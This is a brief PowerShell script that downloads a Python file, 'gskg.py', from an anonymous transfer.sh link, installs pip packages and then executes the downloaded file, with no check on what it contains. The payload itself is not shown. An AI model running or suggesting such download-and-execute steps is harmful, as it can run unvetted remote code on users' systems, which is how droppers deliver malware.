$url = "https://transfer.sh/get/dAAJCeTmdL/gskg.py"
$filePath = "gskg.py"
$packages = "rich colorama termcolor typer requests"
Invoke-WebRequest -Uri $url -OutFile $filePath
function Try-Execute {
    param(
        [string]$primaryCommand,
        [string]$fallbackCommand
    )
    try {
        Invoke-Expression $primaryCommand
        $success = $true
    } catch {
        Write-Host "Failed to execute: $primaryCommand. Error: $_"
        $success = $false
    }

    if (-not $success) {
        try {
            Invoke-Expression $fallbackCommand
        } catch {
            Write-Host "Failed to execute fallback command: $fallbackCommand. Error: $_"
            exit
        }
    }
}
Try-Execute -primaryCommand "python3 -m pip install $packages" -fallbackCommand "python -m pip install $packages"
Try-Execute -primaryCommand "python3 $filePath" -fallbackCommand "python $filePath"
